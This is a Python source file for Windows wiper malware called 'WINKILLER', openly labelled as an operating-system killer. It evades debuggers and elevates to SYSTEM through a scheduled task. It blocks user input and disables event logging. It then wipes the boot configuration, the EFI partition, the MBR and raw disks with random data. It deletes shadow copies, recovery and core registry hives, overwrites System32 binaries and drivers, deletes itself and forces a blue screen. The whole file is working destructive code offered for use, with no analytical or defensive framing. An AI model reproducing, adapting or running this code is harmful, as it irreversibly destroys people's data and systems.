# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 01.03.2026
# APP: WINKILLER
# TYPE: OS_KILLER
# VERSION: LATEST
# PLATFORM: win32




import os 
from re import compile as re
from locale import getencoding
from mmap import mmap, ACCESS_WRITE
from subprocess import run as sp_run, DEVNULL
from concurrent.futures import ThreadPoolExecutor
from ctypes import byref, c_char, windll, wintypes
from sys import exit as _exit, argv, platform, executable


if platform != 'win32':
    print(f'DO NOT SUPPORT ({platform})')
    _exit(1)


__file__ = os.path.abspath(argv[0])
IS_EXE = __file__.endswith('.exe')

SYSTEMDISK = os.getenv('SYSTEMDRIVE', 'C:')
if not SYSTEMDISK.endswith(os.sep): SYSTEMDISK += os.sep
WINDIR = os.getenv('WINDIR', 'Windows')
SYSTEM32 = os.path.join(WINDIR, 'System32')

CHAR = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'


def getenc():
    cp = f'cp{windll.kernel32.GetConsoleOutputCP()}'

    try:
        'cp'.encode(cp)
        return cp
    except:
        return getencoding()
    

def get_used_disk_size(d):
    total = wintypes.ULARGE_INTEGER()
    free = wintypes.ULARGE_INTEGER()

    success = windll.kernel32.GetDiskFreeSpaceExW(
        d,
        None,               
        byref(total),    
        byref(free)     
    )

    return 0 if not success else total.value - free.value


def get_disks():
    disks = []

    mask = windll.kernel32.GetLogicalDrives()

    for (n, letter) in enumerate(CHAR):
        if mask & (1 << n):
            disks.append(letter)

    sd = SYSTEMDISK[0]

    if sd in disks:
        disks.remove(sd)

    return disks


def writef(dev, size):
    kernel32 = windll.kernel32
 
    handle = kernel32.CreateFileW(
        dev,
        0x10000000 | 0x20000000 | 0x40000000 | 0x80000000, 
        0x00000001 | 0x00000002,  
        None,
        3,  
        0x80 | 0x20000000,  
        None
    )
        
    if handle == wintypes.HANDLE(-1):
        return False
    
    kernel32.SetFilePointer(handle, 0, None, 0)

    buffer_size = 10_485_760
    buffer = bytearray(buffer_size)
    ptr = memoryview(buffer)

    total = 0

    while total < size:
        chunk = min(buffer_size, size - total)
        ptr[:chunk] = os.urandom(chunk)
        written_total = 0

        while written_total < chunk:
            written = wintypes.DWORD()

            success = kernel32.WriteFile(
                handle,
                (c_char * (chunk - written_total)).from_buffer(ptr, written_total),
                chunk - written_total,
                byref(written),
                None
            )

            if not success:
                kernel32.CloseHandle(handle)
                return False

            written_total += written.value

        total += written_total

    kernel32.FlushFileBuffers(handle)
    kernel32.CloseHandle(handle)

    return True


def is_bios():
    fw = wintypes.DWORD()
    windll.kernel32.GetFirmwareType(byref(fw))

    return fw.value == 1


def cmd(c, out=False, _new=False):
    try:
        if out:
            return sp_run(c, capture_output=True, text=True, encoding=getenc(), timeout=30).stdout

        return sp_run(c, stdout=DEVNULL, stderr=DEVNULL, start_new_session=_new, timeout=30).returncode
    except:
        return '' if out else -1
    

def get_admin():
    if windll.shell32.IsUserAnAdmin() != 0:
        return
    
    windll.shell32.ShellExecuteW(
        None, 
        'runas', 
        *((__file__, None) if IS_EXE else (executable, __file__)), 
        None, 
        0
    )
    os._exit(0)


def get_SYSTEM():
    if '-s' in argv:
        return
    
    TASK_NAME = 'winsys'
    
    for n in (
        [
            'schtasks', 
            '/create', '/f',
            '/tn', TASK_NAME,        
            '/tr', f'{__file__} -s' if IS_EXE else f'{executable} {__file__} -s',               
            '/sc', 'onstart', 
            '/ru', 'SYSTEM'
        ],
        ['schtasks', '/run', '/tn', TASK_NAME],
        ['schtasks', '/delete', '/f', '/tn', TASK_NAME]
    ):
        cmd(n)
    os._exit(0)


def fill_file(fd, size):
    chunk_size = 4_194_304

    with mmap(fd, size, access=ACCESS_WRITE) as mf: 
        for offset in range(0, size, chunk_size):
            end = min(offset + chunk_size, size)
            mf[offset:end] = os.urandom(end - offset) 


def remove_file(p):
    if os.path.islink(p):
        os.unlink(p)  
        return True
     
    if not os.path.isfile(p):
        return False
    
    cmd(['takeown', '/f', p])
    cmd(['icacls', p, '/grant', 'SYSTEM:F'])
    cmd(['attrib', '-r', '-s', '-h', p])

    if not os.access(p, os.W_OK):
        return False
    
    try:
        with open(p, 'rb+') as f:
            fd = f.fileno()

            for _ in range(3):
                fill_file(fd, os.path.getsize(p))

            f.flush()
            os.fsync(fd)
    except:
        return False
    
    return True


def remove_dir(p):
    for root, _, files in os.walk(p):
        for n in files:
            try:
                fp = os.path.join(root, n)

                remove_file(fp)
            except:
                continue


def remove_windir(p):
    for n in os.listdir(p):
        if not n.endswith(('.efi', '.exe', '.msc', '.dll')):
            continue

        remove_file(n)


def BCD():
    output = cmd(['bcdedit', '/enum', 'all'], out=True)

    if not output:
        return
    
    records = {'{bootmgr}', '{fwbootmgr}', '{current}', '{default}', '{memdiag}'}

    exp = re(r'({\S+})')
    flag = False

    for n in output.splitlines():
        if flag:
            guid = exp.search(n)

            if guid:
                records.add(guid.group(1))
                flag = False

        if n.startswith('-----'):
            flag = True

    for n in records:cmd(['bcdedit', '/delete', n, '/f'])
    remove_file(os.path.join(SYSTEMDISK, 'Boot', 'BCD')) 
    cmd(['reg', 'delete', 'HKLM\\BCD00000000', '/f'])


def ESP():
    for n in CHAR:
        disk = f'{n}:\\'

        if os.path.exists(disk):
            continue

        tom = f'{n}:'
        break
    else:
        return

    for n in cmd(['mountvol'], out=True).splitlines():
        n = n.strip()

        if not n.startswith('\\\\?\\'):
            continue

        cmd(['mountvol', tom, n])

        if not os.path.exists(os.path.join(disk, 'Boot')):
            cmd(['mountvol', tom, '/d'])
            continue

        if not writef(f'\\\\.\\{tom}', get_used_disk_size(disk)):
            remove_dir(disk)

        cmd(['mountvol', tom, '/d'])


def BIOS():
    SIGN = b'\x55\xAA'

    dev = None

    for n in range(3):
        d = f'\\\\.\\PhysicalDrive{n}'

        try:
            with open(d, 'rb') as f:
                sector = memoryview(f.read(512))

                if (len(sector) == 512) and (sector[510:512] == SIGN):
                    dev = d
                    break
        except:
            continue
    
    if dev is None:
        return

    writef(dev, 1_048_576)
            

def DEVICE():
    with ThreadPoolExecutor(max_workers=3) as pool:
        for t in [pool.submit(writef, f'\\\\.\\PhysicalDrive{n}', 10_485_760) for n in range(1, 4)]:
            t.result()

    disks = get_disks()

    with ThreadPoolExecutor(max_workers=len(disks)) as pool:
        for t in [pool.submit(writef, f'\\\\.\\{n}:', 10_485_760) for n in disks]:
            t.result()


def WINDOWS():
    for n in (
        ['powershell', '-Command', f'Disable-ComputerRestore -Drive "{SYSTEMDISK}"'],
        ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
        ['reagentc', '/disable']
    ):
        cmd(n)

    for n in [
        'HKLM\\HARDWARE',      
        'HKLM\\SYSTEM',         
        'HKLM\\SECURITY',       
        'HKLM\\SAM'            
    ]:
        cmd(['reg', 'delete', n, '/f'])

    with ThreadPoolExecutor(max_workers=30) as pool:
        for t in [pool.submit(remove_file, p) for p in [
            os.path.join(SYSTEMDISK, 'pagefile.sys'),
            os.path.join(SYSTEMDISK, 'swapfile.sys'),
            os.path.join(SYSTEMDISK, 'hiberfil.sys'),
            os.path.join(SYSTEMDISK, 'Recovery', 'ReAgent.xml'),
            os.path.join(SYSTEM32, 'Recovery', 'ReAgent.xml')
        ]]:
            t.result()

        config32 = os.path.join(SYSTEM32, 'config')
        if os.path.isdir(config32):
            for t in [pool.submit(remove_file, p) for p in os.listdir(config32)]:
                t.result()

        for t in [pool.submit(remove_windir, p) for p in [
            SYSTEM32, 
            os.path.join(WINDIR, 'SysWOW64')
        ]]:
            t.result()

        for t in [pool.submit(remove_dir, p) for p in [
            os.path.join(WINDIR, 'Boot'),
            os.path.join(SYSTEM32, 'Boot'),
            os.path.join(SYSTEM32, 'drivers')
        ]]:
            t.result()


def BSOD():
    ntdll = windll.ntdll
    
    ntdll.RtlAdjustPrivilege(
        19, 
        True, 
        False, 
        byref(wintypes.BOOLEAN())
    )
    ntdll.NtRaiseHardError(
        0xC0000022, 
        0, 
        0, 
        None, 
        6, 
        byref(wintypes.ULONG())
    )


def main():
    if windll.kernel32.IsDebuggerPresent():
        _exit(0)

    get_admin()
    get_SYSTEM()

    windll.user32.BlockInput(True)
    cmd(['sc', 'stop', 'EventLog'])
    cmd(['sc', 'config', 'EventLog', 'start=', 'disabled'])

    BCD()
    ESP()
    if is_bios():BIOS()
    DEVICE()
    WINDOWS()

    if os.path.isfile(__file__):
        remove_file(__file__)
        try:
            os.remove(__file__)
        except: ...

    BSOD()
    os._exit(0)


if __name__ == '__main__': main()